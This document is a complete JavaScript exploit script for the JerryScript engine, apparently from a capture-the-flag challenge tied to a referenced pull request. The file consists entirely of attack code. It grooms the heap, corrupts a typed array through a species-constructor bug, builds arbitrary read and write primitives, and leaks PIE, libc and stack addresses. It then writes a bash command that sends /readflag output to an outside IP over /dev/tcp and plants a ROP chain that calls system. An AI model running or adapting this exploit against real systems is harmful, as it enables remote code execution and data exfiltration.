// https://github.com/jerryscript-project/jerryscript/pull/4794
let a = []
let b = []
for(let i=0;i<100;i++){
	a.push(new Uint32Array(0x300).fill(i))
	b.push(new Uint16Array(0x300))
}

for(let i=0;i<100;i++){
	delete b[i]
}
gc()

b = []
for(let i=0;i<40;i++){
	b.push(new Uint16Array(0x300))
}
function test(constructor, constructor2, from) {
	var modifiedConstructor = new constructor(0x300);
	modifiedConstructor.fill(0x31313131)
	modifiedConstructor[384] = 0x1a90021
	modifiedConstructor[384+1] = 0x950000
	modifiedConstructor[384+2] = 0x117
	modifiedConstructor[384+3] = 0xffffff
	modifiedConstructor.constructor = constructor2;
	return modifiedConstructor.filter(x => x)
}
// for(let i=0;i<100000000;i++){}
let c = test(Uint32Array,Uint16Array);

let z = null
for(let i=0;i<60;i++){
	if(a[i].length != 0x300){
		z = a[i]
		break
	}
}
if(!z){print('z not found');while(1){}}
print('corrupted size: '+z.length)

let x = []
for(let i=0;i<100;i++){
	x.push(new Uint32Array(0x10).fill(i))
	x.push({'a':2})
}
for(let i=0;i<100;i++){
	delete x[i]
}

gc()
let leakLittle = 0
let leakBig = 0
let skip = 0
for(let i=0;true;i++){
	let d = z[i]&0xff00
	if((d == 0x5500 || d == 0x5600)){
		if(skip++ == 1){
			leakLittle = z[i-1]
			leakBig = z[i]
			break
		}
	}
}
// leakLittle -= 0xe7a00-0x4000
leakLittle -= leakLittle&0xfff

let overWriteTarget = new Uint32Array(0x500)
overWriteTarget[0] = 0xdeedbeef
let corruptedIdx = 0
for(let i=0;true;i++){
	if(z[i] == 0xdeedbeef){
		corruptedIdx = i-4
		break
	}
}
z[corruptedIdx+2] = 0x10117

function arbRead(toRead){
	z[corruptedIdx+4] = toRead[0]
	z[corruptedIdx+5] = toRead[1]
	return [overWriteTarget[0],overWriteTarget[1]]
}
function arbWrite(addr,w){
	z[corruptedIdx+4] = addr[0]
	z[corruptedIdx+5] = addr[1]
	overWriteTarget[0] = w[0]
	overWriteTarget[1] = w[1]
}
print('piebase: 0x'+leakBig.toString(16)+leakLittle.toString(16))
while(arbRead([leakLittle,leakBig])[0] != 0x464c457f){
	leakLittle=leakLittle-0x1000	
}
print('piebase: 0x'+leakBig.toString(16)+leakLittle.toString(16))
let libcbase = arbRead([leakLittle+0x68e78,leakBig])
libcbase[0] -= 0xa5120
print('libcbase: 0x'+libcbase[1].toString(16)+libcbase[0].toString(16))
let stackBase = arbRead([libcbase[0]+0x221200,libcbase[1]])
print('environ: 0x'+stackBase[1].toString(16)+stackBase[0].toString(16))
while((arbRead([stackBase[0],stackBase[1]])[0]&0xfff) != 0x3b0){
	stackBase[0] = stackBase[0] - 8
}
print('stack: 0x'+stackBase[1].toString(16)+stackBase[0].toString(16))

let cmd = 'bash -c "/readflag > /dev/tcp/111.11.1.1/9000"\x00'
let cmdAddr = [leakLittle+0xb5000,leakBig]
for(let i=0;i<cmd.length;i++){
	arbWrite(cmdAddr,[cmd.charCodeAt(i),0])
	cmdAddr[0] += 1
}

// 0x00000000000076ec: pop rdi; pop rbp; ret;
// 0x50d60 - system
// 

arbWrite(stackBase,[leakLittle+0x76ec,leakBig])
stackBase[0] += 8
arbWrite(stackBase,[leakLittle+0xb5000,leakBig])
stackBase[0] += 8
arbWrite(stackBase,[0,0])
stackBase[0] += 8
arbWrite(stackBase,[libcbase[0]+0x50d60,libcbase[1]])
exit(0)
